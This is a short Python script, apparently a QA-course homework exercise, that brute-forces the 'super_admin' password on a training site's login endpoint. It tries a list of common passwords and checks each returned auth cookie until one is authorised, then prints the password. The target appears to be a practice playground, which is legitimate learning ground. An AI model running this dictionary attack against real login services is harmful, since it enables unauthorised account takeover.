import requests

list_of_passwords = ['123456', '123456789', 'qwerty', 'password', '1234567','12345678', '12345', 'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']
for user_password in list_of_passwords:
    payload = {"login": "super_admin", "password": user_password}
    response_1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_response = response_1.cookies.get('auth_cookie')

    cookies = {"auth_cookie": cookie_response}
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response.text != 'You are NOT authorized':
        print(f"Ответ: {response.text}.")
        print(f"Пароль пользователя: {user_password}")
        break